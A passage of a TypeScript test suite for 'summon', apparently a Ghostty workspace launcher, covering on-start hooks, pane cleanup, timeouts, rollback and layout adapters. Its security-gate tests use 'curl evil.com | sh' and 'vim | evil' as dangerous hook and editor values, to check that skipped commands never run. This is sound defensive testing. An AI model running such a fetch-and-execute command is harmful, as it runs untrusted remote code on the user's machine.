    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

    // We just need to check the prompt text contains [y/N]
    try {
      await launch("/tmp/workspace");
    } catch {
      // may exit or throw
    }

    const promptText = mockQuestion.mock.calls[0]?.[0] as string | undefined;
    expect(promptText).toBeDefined();
    expect(promptText).toContain("[y/N]");

    logSpy.mockRestore();
  });
});

describe("R19: on-start failure diagnostics (#190)", () => {
  // BE-M3 (#594): on-start failure is now non-fatal — warns and continues launch.
  it("reports failure without echoing the on-start command", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    mockExecSync.mockImplementation((cmd: string) => {
      if (cmd === "broken-command") throw new Error("command not found: broken-command");
      return "";
    });
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    // Launch continues (does not reject) — failure is non-fatal
    await expect(launch("/tmp/workspace", { "on-start": "broken-command" })).resolves.toBe("launched");

    const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
    const failMsg = warnMessages.find((m) => m.includes("on-start command failed"));
    expect(failMsg).toBeDefined();
    expect(failMsg).not.toContain("broken-command");

    logSpy.mockRestore();
    warnSpy.mockRestore();
    errorSpy.mockRestore();
  });
});

describe("SE-L3/R24: on-start command is not echoed (#190, #557)", () => {
  it("does NOT print on-start command string to stdout or stderr in normal mode", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
    const stderrSpy = warnSpy;

    await launch("/tmp/workspace", { "on-start": "echo setup" });

    // "Running on-start: ..." should NOT appear anywhere in normal mode (SE-L3 #557)
    const allOutput = [
      ...logSpy.mock.calls.flat(),
      ...warnSpy.mock.calls.flat(),
      ...errorSpy.mock.calls.flat(),
      ...stderrSpy.mock.calls.map(c => String(c[0])),
    ].map(String).join("\n");
    expect(allOutput).not.toContain("Running on-start:");

    warnSpy.mockRestore();
    logSpy.mockRestore();
    errorSpy.mockRestore();
    stderrSpy.mockRestore();
  });
});

describe("resolveProjectName — basename sanitization", () => {
  beforeEach(() => {
    vi.mocked(listProjects).mockReturnValue(new Map<string, string>());
  });

  it("returns registered name when path matches registry", () => {
    vi.mocked(listProjects).mockReturnValue(new Map([["api", "/tmp/workspace"]]));
    expect(resolveProjectName("/tmp/workspace")).toBe("api");
  });

  it("returns plain basename when it matches PROJECT_NAME_RE", () => {
    expect(resolveProjectName("/tmp/my-project")).toBe("my-project");
  });

  it("sanitizes and warns when basename contains spaces", () => {
    const warn = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
    expect(resolveProjectName("/tmp/my app")).toBe("my-app");
    expect(warn.mock.calls).toEqual([['summon: warning: Project name "my app" contains unsupported characters; using "my-app" for tab title and status tracking.\n']]);
    warn.mockRestore();
  });

  it("sanitizes 'my app (v2)' to 'my-app-v2'", () => {
    const warn = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
    expect(resolveProjectName("/tmp/my app (v2)")).toBe("my-app-v2");
    warn.mockRestore();
  });

  it("falls back to 'project' when basename is all meta-chars", () => {
    const warn = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
    expect(resolveProjectName("/tmp/@@@")).toBe("project");
    warn.mockRestore();
  });
});

describe("probePaneCount", () => {
  it("returns parsed integer when osascript succeeds", () => {
    mockExecFileSync.mockImplementation((bin: string) => {
      if (bin === "osascript") return "5\n";
      return "";
    });
    expect(probePaneCount()).toBe(5);
  });

  it("returns null when osascript throws", () => {
    mockExecFileSync.mockImplementation((bin: string) => {
      if (bin === "osascript") throw new Error("Ghostty not running");
      return "";
    });
    expect(probePaneCount()).toBeNull();
  });

  it("returns null when output is non-numeric", () => {
    mockExecFileSync.mockImplementation((bin: string) => {
      if (bin === "osascript") return "garbage\n";
      return "";
    });
    expect(probePaneCount()).toBeNull();
  });

  it("returns null on negative output", () => {
    mockExecFileSync.mockImplementation((bin: string) => {
      if (bin === "osascript") return "-1\n";
      return "";
    });
    expect(probePaneCount()).toBeNull();
  });
});

describe("decideCleanRestoredPanes", () => {
  let warnSpy: ReturnType<typeof vi.spyOn>;

  beforeEach(() => {
    warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
    delete process.env.SUMMON_WORKSPACE;
  });

  afterEach(() => {
    warnSpy.mockRestore();
  });

  function mockProbe(n: number | null): void {
    mockExecFileSync.mockImplementation((bin: string) => {
      if (bin === "osascript") {
        if (n === null) throw new Error("probe error");
        return `${n}\n`;
      }
      return "";
    });
  }

  it("sets cleanRestoredPanes=true and notifies when probe > 1 and SUMMON_WORKSPACE unset", () => {
    mockProbe(5);
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    const opts: Record<string, unknown> = { newWindow: false };
    // clean must be explicitly enabled (BE-H1 #362)
    decideCleanRestoredPanes(opts, { clean: "true" }, new Map(), new Map(), false);
    expect(opts["cleanRestoredPanes"]).toBe(true);
    expect(logSpy).toHaveBeenCalledWith(expect.stringContaining("Clearing 4 stale panes"));
    logSpy.mockRestore();
  });

  it("uses singular 'pane' when stale count is 1", () => {
    mockProbe(2);
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    const opts: Record<string, unknown> = { newWindow: false };
    // clean must be explicitly enabled (BE-H1 #362)
    decideCleanRestoredPanes(opts, { clean: "true" }, new Map(), new Map(), false);
    expect(logSpy).toHaveBeenCalledWith(expect.stringContaining("Clearing 1 stale pane "));
    logSpy.mockRestore();
  });

  it("no-op when SUMMON_WORKSPACE is set", () => {
    process.env.SUMMON_WORKSPACE = "1";
    mockProbe(5);
    const opts: Record<string, unknown> = {};
    decideCleanRestoredPanes(opts, {}, new Map(), new Map(), false);
    expect(opts["cleanRestoredPanes"]).toBeUndefined();
    expect(warnSpy).not.toHaveBeenCalled();
  });

  it("no-op when newWindow=true", () => {
    mockProbe(5);
    const opts: Record<string, unknown> = { newWindow: true };
    decideCleanRestoredPanes(opts, {}, new Map(), new Map(), false);
    expect(opts["cleanRestoredPanes"]).toBeUndefined();
    expect(warnSpy).not.toHaveBeenCalled();
  });

  it("no-op in dry-run mode without explicit --clean (probe not called)", () => {
    const opts: Record<string, unknown> = {};
    decideCleanRestoredPanes(opts, {}, new Map(), new Map(), true);
    expect(opts["cleanRestoredPanes"]).toBeUndefined();
    expect(warnSpy).not.toHaveBeenCalled();
    // execFileSync should not have been called for osascript
    const osascriptCalls = mockExecFileSync.mock.calls.filter(
      (call) => call[0] === "osascript",
    );
    expect(osascriptCalls).toHaveLength(0);
  });

  it("sets cleanRestoredPanes=true in dry-run when --clean explicitly passed", () => {
    const opts: Record<string, unknown> = {};
    decideCleanRestoredPanes(opts, { clean: "true" }, new Map(), new Map(), true);
    expect(opts["cleanRestoredPanes"]).toBe(true);
    // No probe called in dry-run
    const osascriptCalls = mockExecFileSync.mock.calls.filter(
      (call) => call[0] === "osascript",
    );
    expect(osascriptCalls).toHaveLength(0);
  });

  it("no-op when count <= 1", () => {
    mockProbe(1);
    const opts: Record<string, unknown> = {};
    decideCleanRestoredPanes(opts, {}, new Map(), new Map(), false);
    expect(opts["cleanRestoredPanes"]).toBeUndefined();
    expect(warnSpy).not.toHaveBeenCalled();
  });

  it("no-op when probe returns null (osascript errors)", () => {
    mockProbe(null);
    const opts: Record<string, unknown> = {};
    decideCleanRestoredPanes(opts, {}, new Map(), new Map(), false);
    expect(opts["cleanRestoredPanes"]).toBeUndefined();
    expect(warnSpy).not.toHaveBeenCalled();
  });

  it("no-op when CLI override clean=false", () => {
    mockProbe(5);
    const opts: Record<string, unknown> = {};
    decideCleanRestoredPanes(opts, { clean: "false" }, new Map(), new Map(), false);
    expect(opts["cleanRestoredPanes"]).toBeUndefined();
    expect(warnSpy).not.toHaveBeenCalled();
  });

  it("respects project config clean=false when no CLI override", () => {
    mockProbe(5);
    const project = new Map([["clean", "false"]]);
    const opts: Record<string, unknown> = {};
    decideCleanRestoredPanes(opts, {}, project, new Map(), false);
    expect(opts["cleanRestoredPanes"]).toBeUndefined();
    expect(warnSpy).not.toHaveBeenCalled();
  });

  it("CLI clean=true overrides project clean=false", () => {
    mockProbe(5);
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    const project = new Map([["clean", "false"]]);
    const opts: Record<string, unknown> = {};
    decideCleanRestoredPanes(opts, { clean: "true" }, project, new Map(), false);
    expect(opts["cleanRestoredPanes"]).toBe(true);
    expect(logSpy).toHaveBeenCalledWith(expect.stringContaining("Clearing"));
    logSpy.mockRestore();
  });
});

describe("BE-M12: osascript 30-second timeout (#302)", () => {
  it("throws a human-readable message when osascript times out (ETIMEDOUT)", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    const timeoutError = Object.assign(new Error("spawnSync osascript ETIMEDOUT"), { code: "ETIMEDOUT" });
    mockExecFileSync.mockImplementation((bin: string, _args?: string[], opts?: Record<string, unknown>) => {
      if (bin === "osascript" && opts?.input) throw timeoutError;
      if (bin === "/usr/bin/which") return "/usr/bin/stub\n";
      return "";
    });

    const writeSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await expect(launch("/tmp/workspace")).rejects.toThrow("Ghostty did not respond within 30 seconds");
    const allWrites = writeSpy.mock.calls.map((c) => String(c[0])).join(" ");
    expect(allWrites).toContain("Ghostty did not respond within 30 seconds");
    expect(allWrites).toContain("Is Ghostty running?");

    writeSpy.mockRestore();
  });

  it("passes timeout: 30_000 to execFileSync for main script execution", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    await launch("/tmp/workspace");

    const osascriptCall = mockExecFileSync.mock.calls.find(
      (c) => c[0] === "osascript" && typeof c[2] === "object" && c[2] !== null && "input" in (c[2] as Record<string, unknown>),
    );
    expect(osascriptCall).toBeDefined();
    expect((osascriptCall![2] as Record<string, unknown>)["timeout"]).toBe(30_000);
  });
});

describe("AR-M1: process.exit -> thrown errors in launcher (#306)", () => {
  it("ensureGhostty throws an Error instead of calling process.exit when Ghostty missing", async () => {
    vi.mocked(existsSync).mockImplementation((path) => {
      if (String(path).endsWith("Ghostty.app")) return false;
      return true;
    });

    // The launch call should reject with a descriptive Error (not process.exit)
    await expect(launch("/tmp/workspace")).rejects.toThrow("Ghostty.app not found");
  });

  // BE-M3 (#594): on-start failure is now non-fatal — warns and continues launch.
  it("warns (not throws) when on-start fails, and launch still completes", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    mockExecSync.mockImplementation((cmd: string) => {
      if (cmd === "bad-command") throw new Error("not found");
      return "";
    });
    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    // Should NOT throw — warn and continue
    await expect(launch("/tmp/workspace", { "on-start": "bad-command" })).resolves.toBe("launched");
    expect(warnSpy).toHaveBeenCalledWith(expect.stringContaining("on-start command failed"));

    warnSpy.mockRestore();
    errorSpy.mockRestore();
  });
});

describe("UX-M3: success message after launch (#312)", () => {
  it("prints a success message to stderr after a successful workspace launch (FE-M5 #549)", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    const stderrSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
    const warnSpy = stderrSpy; // UX-M2: warnings are stderr writes

    await launch("/tmp/workspace");

    const stderrMessages = [
      ...stderrSpy.mock.calls.map(c => String(c[0])),
      ...errorSpy.mock.calls.flat().map(String),
    ].join("\n");
    const successMsg = stderrMessages.match(/summon|workspace|ready/i);
    expect(successMsg).toBeDefined();

    stderrSpy.mockRestore();
    errorSpy.mockRestore();
    warnSpy.mockRestore();
  });

  it("does NOT print success message in dry-run mode", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await launch("/tmp/workspace", { dryRun: true });

    // Dry-run output is the script itself — no "summoned/ready" success line
    const logMessages = logSpy.mock.calls.map((c) => String(c[0]));
    const successMsg = logMessages.find(
      (m) => (m.includes("summoned") || m.includes("ready")) && !m.includes("dry-run"),
    );
    expect(successMsg).toBeUndefined();

    logSpy.mockRestore();
    warnSpy.mockRestore();
  });
});

// ─── BE-S26 (#322): Rollback on partial launch failure ───────────────────────

describe("rollback on executeScript failure (BE-S26 #322, BE-M2)", () => {
  it("closes nothing when a default-mode launch into the user's own window fails (BE-M2)", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    // Track whether the rollback (close window) script was attempted
    let mainScriptExecuted = false;
    let rollbackAttempted = false;

    mockExecFileSync.mockImplementation((bin: string, args?: string[], callOpts?: Record<string, unknown>) => {
      if (bin === "osascript") {
        const inputScript = callOpts?.input as string | undefined;
        if (inputScript && /close (window|tab) /.test(inputScript)) {
          // Rollback call
          rollbackAttempted = true;
          return "";
        }
        if (inputScript && !mainScriptExecuted) {
          // First call with a workspace script — simulate ETIMEDOUT
          mainScriptExecuted = true;
          throw new Error("ETIMEDOUT: connection timed out");
        }
        // Accessibility pre-flight or other osascript calls — succeed
        return "";
      }
      if (bin === "/usr/bin/which")
        return "/usr/bin/stub\n";
      return "";
    });

    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await expect(launch("/tmp/workspace")).rejects.toThrow("Failed to execute workspace script");

    // The script reused the front window and recorded no container: the user's window stays.
    expect(mainScriptExecuted).toBe(true);
    expect(rollbackAttempted).toBe(false);

    errorSpy.mockRestore();
    warnSpy.mockRestore();
  });

  it("closeCreatedContainer is a no-op when osascript is not available", () => {
    mockExecFileSync.mockImplementation(() => {
      throw new Error("osascript not found");
    });

    // Should not throw
    expect(() => closeCreatedContainer({ kind: "window", id: "W-1" })).not.toThrow();
  });
});

// ─── Keystroke-failure sentinel detection in executeScript ───────────────────

describe("keystroke-failure detection in executeScript", () => {
  function makeOsascriptMock(sentinel: string) {
    let mainExecuted = false;
    let rollbackAttempted = false;
    const impl = (bin: string, _args?: string[], opts?: Record<string, unknown>) => {
      if (bin === "osascript") {
        const input = opts?.input as string | undefined;
        if (input && /close (window|tab) /.test(input)) {
          rollbackAttempted = true;
          return "";
        }
        if (input && !mainExecuted) {
          mainExecuted = true;
          throw new Error(`execution error: ${sentinel} (-1728)`);
        }
        return "";
      }
      if (bin === "/usr/bin/which") return "/usr/bin/stub\n";
      return "";
    };
    return { impl, getRollback: () => rollbackAttempted };
  }

  it("throws TabOpenError and skips rollback when osascript reports summon-newtab-failed", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    const { impl, getRollback } = makeOsascriptMock("summon-newtab-failed");
    mockExecFileSync.mockImplementation(impl);

    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    await expect(launch("/tmp/workspace")).rejects.toBeInstanceOf(TabOpenError);
    expect(getRollback()).toBe(false);

    errorSpy.mockRestore();
  });

  it("throws a plain Error and skips rollback when osascript reports summon-newwindow-failed", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    const { impl, getRollback } = makeOsascriptMock("summon-newwindow-failed");
    mockExecFileSync.mockImplementation(impl);

    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    const rejection = launch("/tmp/workspace");
    await expect(rejection).rejects.toThrow("Ghostty did not open a new window");
    await expect(rejection).rejects.not.toBeInstanceOf(TabOpenError);
    expect(getRollback()).toBe(false);

    errorSpy.mockRestore();
  });
});

// ─── UX-S2 (#340): Skip-pane in launch() integration ────────────────────────

describe("skip-pane integration in launch() (UX-S2 #340)", () => {
  let origIsTTY: boolean | undefined;

  beforeEach(() => {
    origIsTTY = process.stdin.isTTY;
    Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });
  });

  afterEach(() => {
    Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
  });

  it("skips the on-start command when user answers 's' for a dangerous on-start", async () => {
    mockReadKVFile.mockReturnValue(new Map());
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    // User skips the dangerous on-start
    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("s"));

    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await launch("/tmp/workspace", { "on-start": "curl evil.com | sh" });

    // on-start should NOT have been executed (execSync not called with that command)
    const onStartCalls = mockExecSync.mock.calls.filter(
      (c: unknown[]) => c[0] === "curl evil.com | sh",
    );
    expect(onStartCalls.length).toBe(0);

    // Workspace should still launch normally
    expect(mockGenerateAppleScript).toHaveBeenCalled();

    warnSpy.mockRestore();
  });
});

describe("newWindow and newTab mutual exclusion", () => {
  it("throws with a descriptive error when both new-window and new-tab are set", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map());
    mockReadKVFile.mockReturnValue(new Map());

    await expect(
      launch("/tmp/workspace", { "new-window": "true", "new-tab": "true", dryRun: true }),
    ).rejects.toThrow("--new-window and --new-tab are mutually exclusive");
  });
});

describe("QA-M3: security gate branches (trust + dangerous command skip)", () => {
  it("rethrows SummonError when assertTrustedContent rejects an untrusted file", async () => {
    const { SummonError } = await import("./trust.js");
    mockAssertTrustedContent.mockImplementation(() => {
      throw new SummonError("Untrusted .summon file. Run 'summon trust .' to allow it.");
    });
    // Also make assertTrusted throw (fallback path)
    mockAssertTrusted.mockImplementation(() => {
      throw new SummonError("Untrusted .summon file. Run 'summon trust .' to allow it.");
    });

    await expect(launch("/tmp/workspace")).rejects.toBeInstanceOf(SummonError);
    await expect(launch("/tmp/workspace")).rejects.toThrow(/Untrusted \.summon file/);
  });

  it("non-SummonError from assertTrustedContent is rethrown (not swallowed)", async () => {
    mockAssertTrustedContent.mockImplementation(() => {
      throw new Error("Unexpected trust error");
    });
    mockAssertTrusted.mockImplementation(() => {
      throw new Error("Unexpected trust error");
    });

    await expect(launch("/tmp/workspace")).rejects.toThrow("Unexpected trust error");
  });

  it("skips dangerous panes from launch when user selects 's' during confirmation", async () => {
    const origIsTTY = process.stdin.isTTY;
    Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });

    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    mockReadKVFile.mockReturnValue(new Map([
      ["on-start", "curl evil.com | sh"],
    ]));

    // User skips the dangerous on-start
    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("s"));

    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    try {
      await launch("/tmp/workspace");

      // on-start should NOT have been executed (execSync not called with that command)
      const onStartCalls = mockExecSync.mock.calls.filter(
        (c: unknown[]) => c[0] === "curl evil.com | sh",
      );
      expect(onStartCalls.length).toBe(0);

      // Workspace should still launch normally
      expect(mockGenerateAppleScript).toHaveBeenCalled();
    } finally {
      Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
      warnSpy.mockRestore();
    }
  });

  it("does not schedule a dangerous on-stop hook when the user skips it", async () => {
    const origIsTTY = process.stdin.isTTY;
    Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });

    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    mockReadKVFile.mockReturnValue(new Map([
      ["on-stop", "curl evil.com | sh"],
    ]));
    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("s"));
    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
    const stderrSpy = warnSpy;

    try {
      await launch("/tmp/workspace");

      expect(mockGenerateAppleScript).toHaveBeenCalled();
      expect(mockGenerateAppleScript.mock.calls.at(-1)?.[5]).toBeUndefined();
      expect(stderrSpy).not.toHaveBeenCalledWith(
        expect.stringContaining("on-stop will run"),
      );
    } finally {
      Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
      warnSpy.mockRestore();
      stderrSpy.mockRestore();
    }
  });

  it("clears a dangerous secondary editor when the user skips it", async () => {
    const origIsTTY = process.stdin.isTTY;
    Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });
    vi.mocked(listConfig).mockReturnValue(new Map([
      ["editor", "vim"],
      ["secondary-editor", "curl evil.com | sh"],
    ]));
    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("s"));
    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    try {
      await launch("/tmp/workspace");

      expect(mockQuestion).toHaveBeenCalled();
      expect(mockGenerateAppleScript.mock.calls.at(-1)?.[0].secondaryEditor)
        .toBeNull();
    } finally {
      Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
      warnSpy.mockRestore();
    }
  });

  it("skips dangerous pane commands when user selects 's'", async () => {
    const origIsTTY = process.stdin.isTTY;
    Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });

    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    mockReadKVFile.mockReturnValue(new Map());

    // User skips when prompted about dangerous command (pipe in editor command)
    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("s"));

    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    try {
      // editor with shell meta — user skips, workspace launches without it
      await launch("/tmp/workspace", { editor: "vim | evil" });

      // Workspace should have been generated (other panes may still run)
      // Key assertion: no crash after dangerous pane is skipped
      expect(mockGenerateAppleScript).toHaveBeenCalled();
    } finally {
      Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
      warnSpy.mockRestore();
    }
  });
});

describe("FE-M5/UX-M6: progress messages go to stderr, not stdout (#549, #560)", () => {
  it("executeScript writes 'Launching' to stderr before osascript", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    const stderrSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    await launch("/tmp/workspace");

    const allStderr = [
      ...stderrSpy.mock.calls.map(c => String(c[0])),
      ...errorSpy.mock.calls.flat().map(String),
    ].join("\n");
    expect(allStderr.toLowerCase()).toMatch(/launch|summon/i);
    // Progress must NOT appear on stdout (no console.log calls with launch-related text)
    const allStdout = logSpy.mock.calls.flat().map(String).join("\n");
    expect(allStdout).not.toMatch(/summoning workspace/i);

    stderrSpy.mockRestore();
    logSpy.mockRestore();
    errorSpy.mockRestore();
  });
});

describe("AR-L1 #318 #604: layoutOptsToTreePlanOpts adapter — all LayoutOptions plan fields flow through to TreeLayoutPlan", () => {
  // This is a contract test: every LayoutOptions field that TreePlanOptions supports
  // must be correctly forwarded by the adapter in launchTreeLayout. If a new shared
  // field is added to LayoutOptions without being wired in, this test catches it.
  function setupTreeLayout() {
    mockIsCustomLayout.mockReturnValue(true);
    mockReadCustomLayout.mockReturnValue(
      new Map([
        ["tree", "editor | shell"],
        ["pane.editor", "vim"],
        ["pane.shell", "bash"],
        ["new-window", "true"],
        ["fullscreen", "true"],
        ["maximize", "true"],
        ["float", "true"],
        ["editor-size", "80"],
        ["font-size", "16"],
        ["auto-resize", "false"],
      ]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));
  }

  it("fullscreen flag is forwarded from LayoutOptions to TreeLayoutPlan", async () => {
    setupTreeLayout();
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    await launch("/tmp/workspace", { dryRun: true });
    const plan = mockGenerateTreeAppleScript.mock.calls[0]![0] as Record<string, unknown>;
    expect(plan["fullscreen"]).toBe(true);
    logSpy.mockRestore();
  });

  it("maximize flag is forwarded from LayoutOptions to TreeLayoutPlan", async () => {
    setupTreeLayout();
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    await launch("/tmp/workspace", { dryRun: true });
    const plan = mockGenerateTreeAppleScript.mock.calls[0]![0] as Record<string, unknown>;
    expect(plan["maximize"]).toBe(true);
    logSpy.mockRestore();
  });

  it("float flag is forwarded from LayoutOptions to TreeLayoutPlan", async () => {
    setupTreeLayout();
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    await launch("/tmp/workspace", { dryRun: true });
    const plan = mockGenerateTreeAppleScript.mock.calls[0]![0] as Record<string, unknown>;
    expect(plan["float"]).toBe(true);
    logSpy.mockRestore();
  });

  it("editorSize is forwarded from LayoutOptions to TreeLayoutPlan", async () => {
    setupTreeLayout();
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    await launch("/tmp/workspace", { dryRun: true });
    const plan = mockGenerateTreeAppleScript.mock.calls[0]![0] as Record<string, unknown>;
    expect(plan["editorSize"]).toBe(80);
    logSpy.mockRestore();
  });

  it("fontSize is forwarded from LayoutOptions to TreeLayoutPlan", async () => {
    setupTreeLayout();
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    await launch("/tmp/workspace", { dryRun: true });
    const plan = mockGenerateTreeAppleScript.mock.calls[0]![0] as Record<string, unknown>;
    expect(plan["fontSize"]).toBe(16);
    logSpy.mockRestore();
  });

  it("autoResize=false is forwarded from LayoutOptions to TreeLayoutPlan", async () => {
    setupTreeLayout();
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    await launch("/tmp/workspace", { dryRun: true });
    const plan = mockGenerateTreeAppleScript.mock.calls[0]![0] as Record<string, unknown>;
    expect(plan["autoResize"]).toBe(false);
    logSpy.mockRestore();
  });

  it("newWindow flag is forwarded from LayoutOptions to TreeLayoutPlan", async () => {
    setupTreeLayout();
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    await launch("/tmp/workspace", { dryRun: true });
    const plan = mockGenerateTreeAppleScript.mock.calls[0]![0] as Record<string, unknown>;
    expect(plan["newWindow"]).toBe(true);
    logSpy.mockRestore();
  });

  it("cleanRestoredPanes flag is forwarded from LayoutOptions to TreeLayoutPlan (with --clean)", async () => {
    mockIsCustomLayout.mockReturnValue(true);
    mockReadCustomLayout.mockReturnValue(
      new Map([
        ["tree", "editor | shell"],
        ["pane.editor", "vim"],
        ["pane.shell", "bash"],
      ]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    await launch("/tmp/workspace", { dryRun: true, clean: "true" });
    const plan = mockGenerateTreeAppleScript.mock.calls[0]![0] as Record<string, unknown>;
    expect(plan["cleanRestoredPanes"]).toBe(true);
    logSpy.mockRestore();
  });
});

describe("AR-L1 #318: layoutOptsToTreePlanOpts adapter unit tests", () => {
  it("maps all 9 LayoutOptions plan fields when all are set", () => {
    const opts = {
      autoResize: false,
      editorSize: 80,
      fontSize: 14 as number | null,
      newWindow: true,
      newTab: false,
      fullscreen: true,
      maximize: false,
      float: true,
      cleanRestoredPanes: true,
    };
    const result = layoutOptsToTreePlanOpts(opts);
    expect(result).toEqual(opts);
  });

  it("passes undefined through for unset fields", () => {
    const result = layoutOptsToTreePlanOpts({});
    expect(result.autoResize).toBeUndefined();
    expect(result.editorSize).toBeUndefined();
    expect(result.fontSize).toBeUndefined();
    expect(result.newWindow).toBeUndefined();
    expect(result.newTab).toBeUndefined();
    expect(result.fullscreen).toBeUndefined();
    expect(result.maximize).toBeUndefined();
    expect(result.float).toBeUndefined();
    expect(result.cleanRestoredPanes).toBeUndefined();
  });

  it("does not forward LayoutOptions-only fields (editor, editorPanes, sidebarCommand, shell, secondaryEditor)", () => {
    const result = layoutOptsToTreePlanOpts({
      editor: "vim",
      editorPanes: 3,
      sidebarCommand: "lazygit",
      shell: "true",
      secondaryEditor: "btop",
    });
    // None of these fields should appear in the result
    expect(Object.keys(result)).not.toContain("editor");
    expect(Object.keys(result)).not.toContain("editorPanes");
    expect(Object.keys(result)).not.toContain("sidebarCommand");
    expect(Object.keys(result)).not.toContain("shell");
    expect(Object.keys(result)).not.toContain("secondaryEditor");
  });
});

// --- #604 / #437 / #450: unification — TreePlanOptions imported directly, satisfies guard ---

describe("#604 / #437 / #450 (#563): pipeline unification — adapter uses exported TreePlanOptions", () => {
  // The satisfies TreePlanOptions guard in layoutOptsToTreePlanOpts ensures TypeScript
  // rejects the function body if any field present in tree.ts#TreePlanOptions is missing
  // from the return object. This was previously a local hand-mirrored type (LayoutPlanFieldsForTree)
  // that could silently drift from TreePlanOptions. Now it uses the canonical export.
  //
  // Exhaustiveness guard proof (compile-time):
  //   If a new field is added to TreePlanOptions in tree.ts, the `satisfies TreePlanOptions`
  //   expression in layoutOptsToTreePlanOpts will fail tsc until the new field is added.
  //   This is verified by the typecheck step in CI.
  //
  // Runtime proof: the adapter returns exactly the 9 TreePlanOptions fields.

  it("returns exactly the 9 TreePlanOptions fields — no more, no less", () => {
    const result = layoutOptsToTreePlanOpts({
      autoResize: true,
      editorSize: 80,
      fontSize: 16,
      newWindow: false,
      newTab: true,
      fullscreen: false,
      maximize: true,
      float: false,
      cleanRestoredPanes: true,
      // LayoutOptions-only fields — must NOT appear in result
      editor: "vim",
      sidebarCommand: "lazygit",
    });
    expect(Object.keys(result).sort()).toEqual([
      "autoResize",
      "cleanRestoredPanes",
      "editorSize",
      "float",
      "fontSize",
      "fullscreen",
      "maximize",
